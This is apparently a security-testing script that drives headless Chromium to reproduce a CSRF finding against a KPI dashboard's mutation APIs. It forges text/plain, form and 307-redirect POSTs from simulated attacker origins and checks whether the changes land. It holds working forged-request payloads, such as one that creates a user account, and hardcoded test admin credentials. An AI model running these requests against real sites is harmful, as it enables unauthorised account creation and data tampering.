#!/usr/bin/env python3
"""
D8AD-CAN-004 browser-level CSRF reproduction harness (Playwright/Chromium).

Drives a real Chromium against the baseline revision (ea7263d) app and an
attacker HTTP origin, and records -- for each mutation route and request
vector -- whether the host-only SameSite=Lax session cookie is attached
to the forged request and whether the mutation actually lands server-side.

Ground truth is taken from Playwright's network layer:
  * request.all_headers() -> the Cookie/Origin/Content-Type the browser
    actually sent (independent of opaque-response CORS limits on JS).
  * response.status -> the real HTTP status the server returned.
Server-side effect is confirmed independently by querying the app from the
authenticated admin context (same-origin -> cookie always sent) for the
attack's unique marker.

No browser security setting is weakened:
  * no --disable-web-security, no --ignore-certificate-errors, no cookie
    flags relaxed, no SameSite-by-default relaxation.
  * --host-resolver-rules ONLY maps the three test hostnames to loopback
    (a DNS-resolution concern); it does not alter same-site computation,
    which the browser derives from the URL + Public Suffix List.

Hostnames (all resolve to 127.0.0.1 via --host-resolver-rules):
  app.eastern-state-kpi-dashboard.fly.dev:3000  -> the app (cookie host)
  evil.eastern-state-kpi-dashboard.fly.dev:4000-> same-site SIBLING attacker
                                                  (same registrable domain:
                                                   eastern-state-kpi-dashboard
                                                   .fly.dev -- models the
                                                   "attacker got a subdomain
                                                   of the operator's apex"
                                                   conditional case; NOT
                                                   obtainable on real Fly.io)
  evil.attacker.fly.dev:4000                    -> CROSS-SITE attacker
                                                  (different registrable
                                                   domain attacker.fly.dev --
                                                   models the documented
                                                   deployment reality where
                                                   an attacker has their own
                                                   Fly.io app)
"""
import json
import os
import time
import urllib.parse

from playwright.sync_api import sync_playwright

CHROMIUM_EXE = os.environ.get("PLAYWRIGHT_CHROMIUM_EXECUTABLE")

APP_HOST = "app.eastern-state-kpi-dashboard.fly.dev"
SAME_HOST = "evil.eastern-state-kpi-dashboard.fly.dev"
CROSS_HOST = "evil.attacker.fly.dev"
APP_PORT = 3000
ATK_PORT = 4000

APP = f"http://{APP_HOST}:{APP_PORT}"
ATK_SAME = f"http://{SAME_HOST}:{ATK_PORT}"
ATK_CROSS = f"http://{CROSS_HOST}:{ATK_PORT}"

ADMIN_EMAIL = os.environ.get("ADMIN_EMAIL", "kerry@easternstate.org")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "CsrfTest-AdminPass-123!")

RESOLVER_RULES = (
    f"MAP {APP_HOST} 127.0.0.1, MAP {SAME_HOST} 127.0.0.1, MAP {CROSS_HOST} 127.0.0.1"
)


def now_ms():
    return int(time.time() * 1000)


def login(context):
    """Log in as admin on the app origin so the context holds the
    host-only SameSite=Lax session cookie. Returns the admin page."""
    pg = context.new_page()
    pg.goto(APP + "/login", wait_until="domcontentloaded", timeout=15000)
    res = pg.evaluate(
        """async (creds) => {
          const r = await fetch('/api/auth/login', {method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify(creds)});
          return {status: r.status, body: await r.text()};
        }""",
        {"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD},
    )
    if res["status"] != 200:
        raise RuntimeError(f"login failed: {res}")
    me = pg.evaluate(
        """async () => { const r = await fetch('/api/auth/me');
          return {status: r.status, body: await r.text()}; }"""
    )
    if me["status"] != 200:
        raise RuntimeError(f"/api/auth/me after login not 200: {me}")
    # Print the cookie attributes as the browser sees them.
    cookies = context.cookies()
    sess = [c for c in cookies if c["name"] == "eastern_state_kpi_session"]
    print("SESSION COOKIE ATTRIBUTES (browser view):")
    if sess:
        c = sess[0]
        print(json.dumps({
            "name": c["name"], "domain": c["domain"], "path": c["path"],
            "secure": c["secure"], "httpOnly": c["httpOnly"],
            "sameSite": c["sameSite"], "expires": c.get("expires"),
        }, indent=2))
    else:
        print("  WARNING: no session cookie present in context")
    return pg


def admin_fetch(admin_page, path, method="GET", body=None):
    """Same-origin authenticated request from the admin page (cookie always
    sent). Returns {status, body}."""
    return admin_page.evaluate(
        """async (p) => {
          const init = {method: p.method, headers:{}};
          if (p.body) { init.headers['Content-Type']='application/json'; init.body = p.body; }
          const r = await fetch(p.path, init);
          return {status: r.status, body: await r.text()};
        }""",
        {"path": path, "method": method, "body": body},
    )


def run_attack(context, attacker_origin, app_route, mode, method, ctype,
               body, label, admin_page, marker_check):
    """
    Perform one CSRF vector and return a result dict.

    marker_check: callable(admin_page) -> dict describing whether the
                  mutation's unique marker is now present server-side
                  (e.g. {"landed": bool, "detail": ...}).
    """
    target = APP + app_route
    q = urllib.parse.urlencode({
        "target": target, "mode": mode, "method": method,
        "ctype": ctype, "body": body, "label": label,
    })
    attack_url = attacker_origin + "/attack?" + q

    page = context.new_page()
    captured = {
        "label": label, "scenario": attacker_origin, "route": app_route,
        "mode": mode, "method": method, "ctype": ctype,
        "app_request_seen": False, "cookie_header_seen": None,
        "origin_header": None, "req_content_type": None,
        "preflight_seen": False, "preflight_status": None,
        "response_status": None, "transmitted": None,
        "page_js": None,
    }
    req_refs = {"post": None, "preflight": None}

    def on_request(req):
        # Match requests to the APP target route (the mutation endpoint).
        if APP not in req.url or app_route not in req.url:
            return
        try:
            headers = req.all_headers()
        except Exception:
            headers = {}
        if req.method == "OPTIONS":
            captured["preflight_seen"] = True
            req_refs["preflight"] = req
            return
        captured["app_request_seen"] = True
        req_refs["post"] = req
        # Cookie/Origin are exposed by Playwright for navigation/document
        # requests (form-submit) but NOT for fetch subresource requests --
        # so these fields are best-effort and may be None even when the
        # cookie was attached. The definitive cookie-attachment signal is
        # derived below from (response_status, landed).
        ck = headers.get("cookie") or headers.get("Cookie")
        captured["cookie_header_seen"] = bool(ck) if ck is not None else None
        captured["origin_header"] = headers.get("origin")
        captured["req_content_type"] = headers.get("content-type")
        captured["_req_url"] = req.url
        captured["_req_method"] = req.method

    page.on("request", on_request)

    page.goto(attack_url, wait_until="domcontentloaded", timeout=15000)
    # Wait for the page JS to finish (it POSTs /result on the attacker origin).
    try:
        page.wait_for_request(
            lambda r: r.url.endswith("/result") and r.method == "POST",
            timeout=12000,
        )
    except Exception:
        pass
    # Give the network a beat to deliver the app response, then read it
    # directly from the request object (works even for CORS-opaque
    # responses that page.on('response') does not surface).
    for _ in range(30):
        try:
            page.wait_for_timeout(150)
        except Exception:
            pass
        if req_refs["post"] is not None:
            try:
                resp = req_refs["post"].response()
            except Exception:
                resp = None
            if resp is not None:
                captured["response_status"] = resp.status
                captured["transmitted"] = True
                break
        else:
            # No POST request object yet; keep waiting briefly.
            pass
    if captured["response_status"] is None and req_refs["post"] is not None:
        # POST request was constructed by the browser but never received
        # a response -> it was blocked (e.g. CORS preflight denial) and
        # never actually transmitted to the server.
        captured["transmitted"] = False
    if req_refs["preflight"] is not None:
        try:
            pr = req_refs["preflight"].response()
            if pr is not None:
                captured["preflight_status"] = pr.status
        except Exception:
            pass

    # Pull the page-JS observation directly from the attacker server (it
    # collects /result POSTs in-process). This is supplementary; the ground
    # truth is response_status + server_marker below.
    page_js = None
    try:
        import urllib.request as _ur
        with _ur.urlopen(attacker_origin + "/results", timeout=3) as _r:
            page_js = _r.read().decode()
    except Exception:
        page_js = None

    # Server-side ground truth: did the mutation land?
    marker = marker_check(admin_page)

    page.close()

    status = captured["response_status"]
    landed = bool(marker.get("landed"))
    is_same_site = (attacker_origin == ATK_SAME)
    # Whether the browser actually sent the body to the server. For mutation
    # routes, a landed marker is conclusive proof of transmission. For
    # navigation/form-submit the response is capturable. For fetch the CORS-
    # blocked response is discarded by the browser, so request.response()
    # returns None even when the simple request WAS transmitted.
    response_captured = captured["transmitted"] is True

    # ---- Derive cookie attachment DEFINITIVELY ----
    # The body for text/plain and redirect-307 is always valid JSON, so the
    # server parses it regardless of Content-Type; therefore for those modes
    # the mutation lands IFF the cookie was attached. This is an AIRTIGHT
    # cookie-attachment witness: valid-JSON-body + landed => cookie attached;
    # valid-JSON-body + not-landed => cookie NOT attached.
    # SameSite cookie-sending is independent of Content-Type, so the witness
    # generalizes to the urlencoded/multipart/form-submit vectors within the
    # same (scenario, request-context) -- which we confirm directly for
    # form-submit (navigation exposes the Cookie header + status).
    valid_json_body_modes = ("fetch-text-plain", "redirect-307")
    if mode in valid_json_body_modes:
        cookie_attached = landed
        basis = "valid-JSON-body simple request: mutation_landed <=> cookie attached"
    elif mode == "fetch-json":
        # application/json is not CORS-safelisted -> preflight -> baseline app
        # returns no Access-Control-Allow-* -> preflight denied -> POST never
        # transmitted. Cookie attachment is moot (request never sent).
        cookie_attached = None
        basis = "application/json triggers CORS preflight; baseline app returns no ACAO -> request not transmitted (preflight_status=%s)" % captured.get("preflight_status")
    else:  # urlencoded / multipart / form-submit : real non-JSON body
        if status == 400:
            cookie_attached = True
            basis = "HTTP 400 => auth passed (cookie attached) but body not JSON"
        elif status in (401, 403):
            cookie_attached = False
            basis = "HTTP %s => auth failed => cookie not attached" % status
        elif captured["cookie_header_seen"] is not None:
            cookie_attached = captured["cookie_header_seen"]
            basis = "Cookie header observed directly on navigation/form request"
        else:
            # Fetch urlencoded/multipart: response not capturable (CORS).
            # Infer from the same-site/cross-site behavior PROVEN by the
            # text/plain valid-JSON witness for this same scenario, since
            # SameSite cookie-sending is content-type-independent.
            cookie_attached = is_same_site
            basis = ("inferred from scenario SameSite behavior proven by the "
                     "text/plain valid-JSON witness (SameSite is content-type-"
                     "independent); fetch response not capturable due to CORS")

    def status_meaning(status):
        if status is None:
            if mode == "fetch-json":
                return "not transmitted (CORS preflight denied; no POST reached server)"
            if mode in valid_json_body_modes:
                return ("sent (simple request, no preflight) but CORS-blocked "
                        "response not capturable; mutation_landed=%s" % landed)
            return "response not capturable (CORS); mutation did not land"
        if status in (401, 403):
            return "rejected: auth failed (cookie not attached or invalid)"
        if status == 400:
            return "rejected: bad request (cookie attached & auth OK, but body did not parse as JSON -> content-type/parsing gate)"
        if status in (200, 201):
            return "accepted (mutation executed)"
        return f"status {status}"

    captured["response_captured"] = response_captured
    captured["server_marker"] = marker
    captured["cookie_attached"] = cookie_attached
    captured["cookie_attached_basis"] = basis
    captured["mutation_landed"] = landed
    captured["interpretation"] = status_meaning(status)
    captured["page_js_observation"] = page_js
    return captured


def top_level_get_nav(context, attacker_origin, app_route, admin_page):
    """Cross-site (or same-site-sibling) TOP-LEVEL GET navigation to a
    read-only app route, to demonstrate SameSite=Lax sends the cookie on
    safe top-level cross-site navigations (and GET routes are not mutations).
    """
    target = APP + app_route
    page = context.new_page()
    captured = {"scenario": attacker_origin, "route": app_route, "mode": "top-level-GET-nav",
                "method": "GET", "cookie_present": None, "response_status": None,
                "origin_header": None}

    def on_request(req):
        if req.url == target and req.method == "GET":
            try:
                h = req.all_headers()
            except Exception:
                h = {}
            captured["cookie_present"] = bool(h.get("cookie") or h.get("Cookie"))
            captured["origin_header"] = h.get("origin")
            captured["sec_fetch_site"] = h.get("sec-fetch-site")
            captured["sec_fetch_mode"] = h.get("sec-fetch-mode")

    def on_response(resp):
        if resp.url == target and resp.request.method == "GET":
            captured["response_status"] = resp.status

    page.on("request", on_request)
    page.on("response", on_response)
    # First land on the attacker origin so the subsequent goto is a
    # cross-site (or same-site-sibling) top-level navigation.
    page.goto(attacker_origin + "/healthz",
              wait_until="domcontentloaded", timeout=10000)
    try:
        page.goto(target, wait_until="domcontentloaded", timeout=15000)
    except Exception as e:
        captured["nav_error"] = str(e)
    try:
        page.wait_for_timeout(500)
    except Exception:
        pass
    page.close()
    captured["interpretation"] = (
        "cookie attached on safe top-level GET navigation" if captured["cookie_present"]
        else "cookie NOT attached (SameSite blocked)"
    )
    captured["note"] = ("GET routes are read-only (list); cookie attachment here "
                        "demonstrates Lax top-level-safe-navigation behavior, not a mutation.")
    return captured


def main():
    app_check_kpi_id = None
    brk_kpi_id = None
    cat_id = None

    with sync_playwright() as pw:
        launch_options = {
            "headless": True,
            "args": [
                "--host-resolver-rules=" + RESOLVER_RULES,
                "--no-first-run",
                "--no-default-browser-check",
            ],
        }
        if CHROMIUM_EXE:
            launch_options["executable_path"] = CHROMIUM_EXE
        browser = pw.chromium.launch(**launch_options)
        context = browser.new_context()
        admin_page = login(context)

        # Resolve real seed ids for mutation payloads.
        kpis = admin_fetch(admin_page, "/api/kpis")
        kpis_json = json.loads(kpis["body"])["kpis"]
        cats = admin_fetch(admin_page, "/api/categories")
        cats_json = json.loads(cats["body"])["categories"]
        monthly_kpi = next(k for k in kpis_json if k["slug"] == "video-views")
        brk_kpi = next((k for k in kpis_json if k["unit_type"] == "breakdown"),
                       kpis_json[0])
        cat = cats_json[0]
        app_check_kpi_id = monthly_kpi["id"]
        brk_kpi_id = brk_kpi["id"]
        cat_id = cat["id"]
        print(f"resolved ids: monthly_kpi={app_check_kpi_id} breakdown_kpi={brk_kpi_id} category={cat_id}")

        # ---- define payloads + marker checks per route ----
        def make_payloads(route, scenario, vector):
            tag = f"csrf-{scenario}-{vector}-{now_ms() % 100000}"
            if route == "/api/users":
                payload = {"email": f"{tag}@attacker.test", "name": tag,
                           "password": "password123", "role": "viewer"}
                def check(ap):
                    r = admin_fetch(ap, "/api/users")
                    try:
                        users = json.loads(r["body"])["users"]
                        hit = [u for u in users if u["email"] == payload["email"]]
                        return {"landed": bool(hit),
                                "detail": hit[0]["id"] if hit else None}
                    except Exception as e:
                        return {"landed": False, "error": str(e)}
                body = json.dumps(payload)
                return body, check, payload
            if route == "/api/entries":
                payload = {"kpi_id": app_check_kpi_id, "year": 2099, "month": 1,
                           "value": 999424 + (now_ms() % 1000), "notes": tag}
                def check(ap):
                    r = admin_fetch(ap, "/api/entries?year=2099")
                    try:
                        es = json.loads(r["body"])["entries"]
                        hit = [e for e in es if e.get("value") == payload["value"]]
                        return {"landed": bool(hit),
                                "detail": hit[0]["id"] if hit else None}
                    except Exception as e:
                        return {"landed": False, "error": str(e)}
                return json.dumps(payload), check, payload
            if route == "/api/breakdowns":
                payload = {"kpi_id": brk_kpi_id, "year": 2099, "label": tag,
                           "value": 888424 + (now_ms() % 1000)}
                def check(ap):
                    r = admin_fetch(ap, "/api/breakdowns?year=2099")
                    try:
                        bs = json.loads(r["body"])["breakdowns"]
                        hit = [b for b in bs if b.get("label") == tag]
                        return {"landed": bool(hit),
                                "detail": hit[0]["id"] if hit else None}
                    except Exception as e:
                        return {"landed": False, "error": str(e)}
                return json.dumps(payload), check, payload
            if route == "/api/kpis":
                payload = {"category_id": cat_id, "slug": tag[:40],
                           "name": tag, "unit": "count", "unit_type": "count"}
                def check(ap):
                    r = admin_fetch(ap, "/api/kpis")
                    try:
                        ks = json.loads(r["body"])["kpis"]
                        hit = [k for k in ks if k["slug"] == payload["slug"]]
                        return {"landed": bool(hit),
                                "detail": hit[0]["id"] if hit else None}
                    except Exception as e:
                        return {"landed": False, "error": str(e)}
                return json.dumps(payload), check, payload
            if route == "/api/categories":
                payload = {"slug": tag[:40], "name": tag}
                def check(ap):
                    r = admin_fetch(ap, "/api/categories")
                    try:
                        cs = json.loads(r["body"])["categories"]
                        hit = [c for c in cs if c["slug"] == payload["slug"]]
                        return {"landed": bool(hit),
                                "detail": hit[0]["id"] if hit else None}
                    except Exception as e:
                        return {"landed": False, "error": str(e)}
                return json.dumps(payload), check, payload
            raise ValueError(route)

        # ---- vectors ----
        # Full vector set for the representative /api/users route; the three
        # security-distinguishing vectors (fetch-json CORS preflight,
        # fetch-text-plain simple-request bypass, redirect-307) for the other
        # four routes. urlencoded/multipart/form-submit are demonstrated on
        # /api/users and behavior generalizes (non-JSON body -> 400).
        FULL_VECTORS = [
            ("fetch-json", "POST", "application/json"),
            ("fetch-text-plain", "POST", "text/plain"),
            ("fetch-urlencoded", "POST", "application/x-www-form-urlencoded"),
            ("fetch-multipart", "POST", "multipart/form-data"),
            ("form-submit", "POST", "application/x-www-form-urlencoded"),
            ("form-submit", "POST", "text/plain"),
            ("redirect-307", "POST", "text/plain"),
        ]
        KEY_VECTORS = [
            ("fetch-json", "POST", "application/json"),
            ("fetch-text-plain", "POST", "text/plain"),
            ("redirect-307", "POST", "text/plain"),
        ]

        routes_full = ["/api/users"]
        routes_key = ["/api/entries", "/api/breakdowns", "/api/kpis", "/api/categories"]

        scenarios = [
            ("cross-site", ATK_CROSS),
            ("same-site-sibling", ATK_SAME),
        ]

        results = []
        for scen_name, atk in scenarios:
            for route in routes_full:
                for (mode, method, ctype) in FULL_VECTORS:
                    body, check, payload = make_payloads(route, scen_name, mode)
                    label = f"{scen_name}|{route}|{mode}|{ctype}"
                    r = run_attack(context, atk, route, mode, method, ctype,
                                   body, label, admin_page, check)
                    r["payload"] = payload
                    results.append(r)
                    print(f"{label:62s} -> "
                          f"cookie_attached={r['cookie_attached']} status={r['response_status']} "
                          f"landed={r['mutation_landed']}")
            for route in routes_key:
                for (mode, method, ctype) in KEY_VECTORS:
                    body, check, payload = make_payloads(route, scen_name, mode)
                    label = f"{scen_name}|{route}|{mode}|{ctype}"
                    r = run_attack(context, atk, route, mode, method, ctype,
                                   body, label, admin_page, check)
                    r["payload"] = payload
                    results.append(r)
                    print(f"{label:62s} -> "
                          f"cookie_attached={r['cookie_attached']} status={r['response_status']} "
                          f"landed={r['mutation_landed']}")
            # top-level GET nav probe (read-only) per scenario
            r = top_level_get_nav(context, atk, "/api/users", admin_page)
            r["scenario_name"] = scen_name
            results.append(r)
            print(f"{scen_name}|top-level-GET-nav|/api/users -> cookie={r['cookie_present']} "
                  f"status={r['response_status']} sec-fetch-site={r.get('sec_fetch_site')}")

        browser.close()

        out_path = os.path.join(os.path.dirname(__file__), "csrf_results.json")
        with open(out_path, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nWrote {len(results)} results -> {out_path}")


if __name__ == "__main__":
    main()
